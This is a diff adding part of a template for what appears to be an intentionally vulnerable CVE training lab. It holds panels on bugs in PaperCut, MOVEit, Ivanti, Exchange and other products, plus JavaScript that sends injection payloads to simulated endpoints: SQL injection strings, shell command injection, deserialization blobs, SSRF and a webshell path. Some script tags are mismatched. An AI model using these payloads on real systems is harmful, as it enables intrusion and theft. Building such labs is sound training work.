+    <pre class="code" id="docker-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+</div>
+
+<h2 style="margin-top:28px;">Batch 8 — Web Apps, MFT &amp; Platform CVEs</h2>
+<div class="grid grid-2">
+  <div class="panel">
+    <h2><span>CVE-2023-27350</span> — PaperCut Auth Bypass</h2>
+    <p class="mono-dim">Health-check endpoint issues a full admin auth token with no credentials — just a GET request.</p>
+    <a href="/api/papercut/health-check/ex-auth-token" class="btn small" target="_blank">Get admin token →</a>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2024-27956</span> — WordPress Plugin RCE</h2>
+    <p class="mono-dim">Admin-AJAX action with no capability check evaluates its <code>action_data</code> field as Python. No authentication required for this action name.</p>
+    <a href="#" onclick="testWP()" class="btn small">Test →</a>
+    <pre class="code" id="wp2-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2024-38094</span> — SharePoint SSRF</h2>
+    <p class="mono-dim">Rendering preview endpoint fetches any <code>renderingUrl</code> server-side — SSRF for internal network scanning or credential leakage.</p>
+    <a href="#" onclick="testSharePoint()" class="btn small">Test SSRF →</a>
+    <pre class="code" id="sp-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2024-40766</span> — SonicWall SonicOS SQLi</h2>
+    <p class="mono-dim">Management auth endpoint injects username field into SQL. Try classic bypass or UNION-based extraction.</p>
+    <a href="#" onclick="testSonicwall()" class="btn small">Test →</a>
+    <pre class="code" id="sonic-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2024-55591</span> — FortiOS Auth Bypass 2024</h2>
+    <p class="mono-dim">Pre-auth disclosure of device serial and a derivable session token — use to create admin accounts without credentials.</p>
+    <a href="/api/forti/serial-check" class="btn small" target="_blank">Get serial+token →</a>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2024-55956</span> — Cleo MFT Unrestricted Upload</h2>
+    <p class="mono-dim">Pre-auth file upload with automatic execution of uploaded .py files — one upload is enough for RCE, no "run" step needed.</p>
+    <a href="#" onclick="testCleo()" class="btn small">Test upload+exec →</a>
+    <pre class="code" id="cleo-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2022-29499</span> — Mitel MiVoice RCE</h2>
+    <p class="mono-dim">Diagnostic script data parameter injected into shell command. POST to the REST auth endpoint with a crafted <code>data</code> field.</p>
+    <a href="#" onclick="testMitel()" class="btn small">Test →</a>
+    <pre class="code" id="mitel-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2023-35082</span> — Ivanti EPMM Full Export</h2>
+    <p class="mono-dim">Second unauthenticated Ivanti endpoint — exports the complete user database including password hashes and API tokens.</p>
+    <a href="/api/ivanti/epmmobile/api/v2/gateway/exporttask" class="btn small" target="_blank">Dump all users →</a>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2024-37383</span> — Roundcube ManageSieve SSRF</h2>
+    <p class="mono-dim">Filter validation endpoint makes outbound connection to <code>notify_host</code> — SSRF to internal services via the mail server.</p>
+    <a href="#" onclick="testRoundcubeSSRF()" class="btn small">Test SSRF →</a>
+    <pre class="code" id="rc2-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2023-51467</span> — Apache OFBiz Auth Bypass</h2>
+    <p class="mono-dim">Already covered in Batch 6 — <code>?requirePasswordChange=Y</code> bypasses the credential check entirely and returns all users.</p>
+    <a href="/webtools/control/ViewHandlerExt?USERNAME=&PASSWORD=&requirePasswordChange=Y" class="btn small" target="_blank">Bypass →</a>
+  </div>
+</div>
+
+<script>
+async function testWebLogic() {
+  const p=btoa(JSON.stringify({weblogic:'test'}));
+  const r=await fetch('/wls-wsat/CoordinatorPortType',{method:'POST',body:new URLSearchParams({payload:p})});
+  const d=await r.json(); const el=document.getElementById('wl-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testK8s() {
+  const r=await fetch('/api/k8s/namespaces/kube-system/pods',{headers:{'Authorization':'Bearer low-priv-token'}});
+  const d=await r.json(); const el=document.getElementById('k8s-result');
+  el.style.display='block'; el.textContent=JSON.stringify({pods_count:d.pods?.length, secrets_leaked:JSON.stringify(d).includes('DB_PASSWORD')},null,2);
+}
+async function testJupyter() {
+  const r=await fetch('/api/jupyter/nbconvert',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cells:[{cell_type:'code',source:["import os\nprint(os.getcwd())"]}]})});
+  const d=await r.json(); const el=document.getElementById('jup-result');
+  el.style.display='block'; el.textContent=JSON.stringify({cells:d.executed_cells,output:d.results[0]?.output},null,2);
+}
+async function testRails() {
+  const info=await fetch('/rails/session-test');
+  const sample=(await info.json()).sample_cookie_to_forge;
+  const r=await fetch('/rails/session-test',{headers:{'Cookie':'_session_id='+sample}});
+  const d=await r.json(); const el=document.getElementById('rails-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testWSOFull() {
+  const r=await fetch('/api/workspace-one/mdm/api/v1/mdm/devices',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({deviceFriendlyName:'${7*7}'})});
+  const d=await r.json(); const el=document.getElementById('wso2-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testDockerEscape() {
+  const r=await fetch('/api/docker/containers/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:'alpine',Mounts:[{Source:'/tmp/escaped',Target:'/mnt'}]})});
+  const d=await r.json(); const el=document.getElementById('docker-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testWP() {
+  const r=await fetch('/wp-admin/admin-ajax.php',{method:'POST',body:new URLSearchParams({action:'wp_file_manager_backend',action_data:"7*7"})});
+  const d=await r.json(); const el=document.getElementById('wp2-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testSharePoint() {
+  const r=await fetch('/api/sharepoint/sitecore/rendering?renderingUrl=https://httpbin.org/get');
+  const d=await r.json(); const el=document.getElementById('sp-result');
+  el.style.display='block'; el.textContent=JSON.stringify({status:d.status,cve:d.cve},null,2);
+}
+async function testSonicwall() {
+  const r=await fetch('/api/sonicwall/management/api/sonicos/v6/auth',{method:'POST',body:new URLSearchParams({username:"admin'--",password:'anything'})});
+  const d=await r.json(); const el=document.getElementById('sonic-result');
+  el.style.display='block'; el.textContent=JSON.stringify({authenticated:d.authenticated,cve:d.cve},null,2);
+}
+async function testCleo() {
+  const code='OUTPUT="cleo_auto_exec_confirmed"';
+  const f=new FormData(); f.append('file',new Blob([code],{type:'text/plain'}),'cleo_test.py');
+  const r=await fetch('/api/cleo/harvest/upload',{method:'POST',body:f});
+  const d=await r.json(); const el=document.getElementById('cleo-result');
+  el.style.display='block'; el.textContent=JSON.stringify({auto_executed:d.auto_executed,output:d.output},null,2);
+}
+async function testMitel() {
+  const r=await fetch('/api/mitel/mivb/rest/v1/auth',{method:'POST',body:new URLSearchParams({data:'x; echo MITEL_INJECTED'})});
+  const d=await r.json(); const el=document.getElementById('mitel-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testRoundcubeSSRF() {
+  const r=await fetch('/api/roundcube/step2',{method:'POST',body:new URLSearchParams({filter:'keep',notify_host:'httpbin.org'})});
+  const d=await r.json(); const el=document.getElementById('rc2-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+</script>
+
+<h2 style="margin-top:28px;">Batch 6 — Web Apps, IoT &amp; Supply Chain CVEs</h2>
+<div class="grid grid-2">
+  <div class="panel">
+    <h2><span>CVE-2023-34362 (2nd vector)</span> — MOVEit Token Endpoint SQLi</h2>
+    <p class="mono-dim">Second SQLi path in MOVEit — the OAuth token endpoint. POST with <code>grant_type=' UNION SELECT username,password_hash,role,4,5,6,7,8 FROM users--</code>.</p>
+    <a href="#" onclick="testMoveitToken()" class="btn small">Test →</a>
+    <pre class="code" id="moveit2-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2021-34991</span> — Netgear setup.cgi RCE</h2>
+    <p class="mono-dim">Unauthenticated CGI endpoint passes <code>?cmd=</code> directly to shell. Zero authentication, zero sanitization.</p>
+    <a href="/setup.cgi?cmd=id" class="btn small" target="_blank">RCE →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-40044</span> — WS_FTP Deserialization</h2>
+    <p class="mono-dim">Pre-auth pickle deserialization via <code>AdhocUploadArgs</code> form field on the file management API — same class as Telerik and ActiveMQ.</p>
+    <a href="#" onclick="testWSFTP()" class="btn small">Test →</a>
+    <pre class="code" id="wsftp-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-44487</span> — HTTP/2 Rapid Reset DoS</h2>
+    <p class="mono-dim">No per-connection stream limit — a client can declare millions of streams (all immediately reset) consuming server-side resources. Try <code>?stream_count=100000</code>.</p>
+    <a href="/stream/rapid-reset?stream_count=5" class="btn small" target="_blank">Small test →</a>
+    <a href="/stream/rapid-reset?stream_count=10000" class="btn small secondary" style="margin-left:8px;" target="_blank">Large →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-46805 / CVE-2024-21887</span> — Ivanti Connect Secure RCE</h2>
+    <p class="mono-dim">Unauthenticated REST endpoint passes <code>username</code> to a shell command for "LDAP resolution" — inject OS commands directly.</p>
+    <a href="#" onclick="testIvanti()" class="btn small">Test →</a>
+    <pre class="code" id="ivanti2-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-7028</span> — GitLab Account Takeover</h2>
+    <p class="mono-dim">Password reset sends the token to an attacker-supplied <code>cc_email</code> with no confirmation — full account takeover for any user whose email is known.</p>
+    <a href="{{ url_for('gitlab_account_takeover') }}" class="btn small">Open Lab →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-51467</span> — Apache OFBiz Auth Bypass</h2>
+    <p class="mono-dim">Appending <code>?USERNAME=&PASSWORD=&requirePasswordChange=Y</code> bypasses auth and dumps all users. The check returns True before verifying credentials.</p>
+    <a href="/webtools/control/ViewHandlerExt" class="btn small" target="_blank">No bypass →</a>
+    <a href="/webtools/control/ViewHandlerExt?USERNAME=&PASSWORD=&requirePasswordChange=Y" class="btn small secondary" style="margin-left:8px;" target="_blank">Bypassed →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2022-27596</span> — QNAP NAS SQLi</h2>
+    <p class="mono-dim">CGI login handler injects username field into SQL pre-auth. Try classic injection or UNION-based extraction.</p>
+    <a href="#" onclick="testQNAP()" class="btn small">Test →</a>
+    <pre class="code" id="qnap-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2022-46169</span> — Cacti Pre-auth RCE</h2>
+    <p class="mono-dim">Graph rendering endpoint passes <code>local_graph_id</code> to shell with no auth. Try <code>?local_graph_id=1;id</code>.</p>
+    <a href="/cacti/graph.php?local_graph_id=1&rra_id=1" class="btn small" target="_blank">Normal →</a>
+    <a href="/cacti/graph.php?local_graph_id=1%3Becho+CACTI_RCE&rra_id=1" class="btn small secondary" style="margin-left:8px;" target="_blank">RCE →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2021-34473/34523/31207</span> — Exchange ProxyShell</h2>
+    <p class="mono-dim">SSRF → privilege escalation → file write chain. POST with <code>autodiscover_email</code> (SSRF), then add SOAPAction ExportMailboxExport + <code>export_path</code> to plant a webshell.</p>
+    <a href="#" onclick="testProxyShell()" class="btn small">Test chain →</a>
+    <pre class="code" id="proxy2-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+</div>
+
+<script>
+async function testMoveitToken() {
+  const body = new URLSearchParams({grant_type:"' UNION SELECT username,password_hash,role,4,5,6,7,8 FROM users--"});
+  const r = await fetch('/api/moveit/v1/token', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('moveit2-result');
+  el.style.display='block'; el.textContent=JSON.stringify({matched_users:d.matched_users?.slice(0,3)},null,2);
+}
+async function testWSFTP() {
+  const payload = btoa(JSON.stringify({adhoc:'wsftp_test'}));
+  const body = new URLSearchParams({AdhocUploadArgs:payload});
+  const r = await fetch('/ws_ftp/api/files', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('wsftp-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testIvanti() {
+  const body = new URLSearchParams({username:'user; echo IVANTI_RCE'});
+  const r = await fetch('/api/ivanti/ics/rest/oauth2/v2/usermatch', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('ivanti2-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testQNAP() {
+  const body = new URLSearchParams({username:"admin'--", password:'anything'});
+  const r = await fetch('/cgi-bin/qnap/authLogin.cgi', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('qnap-result');
+  el.style.display='block'; el.textContent=JSON.stringify({authenticated:d.authenticated,cve:d.cve},null,2);
+}
+async function testProxyShell() {
+  const body = new URLSearchParams({autodiscover_email:'SYSTEM@exchange.local', export_path:'shell.aspx'});
+  const r = await fetch('/ews/exchange.asmx', {method:'POST', headers:{'SOAPAction':'ExportMailboxExport'}, body});
+  const d = await r.json();
+  const el = document.getElementById('proxy2-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+</script>
+async function testXZ() {
+  const body = new URLSearchParams({user:'crew_member', pubkey:'ssh-rsa AAAA...N2s5RVJhWGk=...extradata'});
+  const r = await fetch('/sshd/auth', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('xz-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testSAML() {
+  const r = await fetch('/saml/consume', {method:'POST', body:JSON.stringify({signature:'valid-outer-sig', assertion:{username:'attacker', role:'admin'}}), headers:{'Content-Type':'application/json'}});
+  const d = await r.json();
+  const el = document.getElementById('saml-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testActiveMQ() {
+  const payload = btoa('\x80\x04\x95\x10\x00\x00\x00\x00\x00\x00\x00\x8c\x04test\x94.');
+  const body = new URLSearchParams({payload});
+  const r = await fetch('/activemq/message', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('amq-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testCF() {
+  const body = new URLSearchParams({amfdata:'!!python/object/apply:os.getcwd []'});
+  const r = await fetch('/cfide/main/ide.cfm', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('cf-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testZeroLogon() {
+  const body = new URLSearchParams({computer_name:'AEGIS-DC', challenge_response:'0000000000000000'});
+  const r = await fetch('/api/netlogon/auth', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('zl-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+</script>
+async function testHeartbleed() {
+  const r = await fetch('/health/ping?payload_length=120', {method:'POST', body:'PING', headers:{'Content-Type':'text/plain'}});
+  const d = await r.json();
+  const el = document.getElementById('hb-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testPhpunit() {
+  const code = "import os\nresult = os.getcwd()\nprint(result)";
+  const r = await fetch('/tools/unit-test-runner', {method:'POST', body:code, headers:{'Content-Type':'text/plain'}});
+  const d = await r.json();
+  const el = document.getElementById('phpunit-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testGraphqlBatch() {
+  const batch = Array.from({length:6}, (_,i) => ({query:`{user uid: ${i+1}}`}));
+  const r = await fetch('/api/graphql/batch', {method:'POST', body:JSON.stringify(batch), headers:{'Content-Type':'application/json'}});
+  const d = await r.json();
+  const el = document.getElementById('gql-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testDnsRebind() {
+  const r = await fetch('/internal/relay-status', {headers:{'Host':'attacker.evil.example.com'}});
+  const d = await r.json();
+  const el = document.getElementById('dns-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testEternalBlue() {
+  const body = new URLSearchParams({session_id:'my-session-xyz', target_session:'0'});
+  const r = await fetch('/smb/auth-bypass', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('eb-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+</script>
+async function testStruts() {
+  const r = await fetch('/tools/upload-classify', {method:'POST', headers:{'Content-Type':"__import__('os').getcwd()"}});
+  const d = await r.json();
+  const el = document.getElementById('struts-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testPanos() {
+  const body = new URLSearchParams({session_id: 'test; echo INJECTED'});
+  const r = await fetch('/vpn/session-init', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('panos-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testWinrar() {
+  const form = new FormData();
+  const blob = new Blob(['fake firmware'], {type:'text/plain'});
+  form.append('package', blob, 'firmware.txt   .py');
+  const r = await fetch('/upload/firmware-package', {method:'POST', body:form});
+  const d = await r.json();
+  const el = document.getElementById('winrar-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testProxy() {
+  const body = new URLSearchParams({url:'https://httpbin.org/get', filename:'fetched_proxy.txt'});
+  const r = await fetch('/proxy/fetch-and-store', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('proxy-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testF5() {
+  const r = await fetch('/api/icontrol/system-info', {headers:{'X-F5-Internal-Auth':'notarealsecret'}});
+  const d = await r.json();
+  const el = document.getElementById('f5-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+</script>
+{% endblock %}
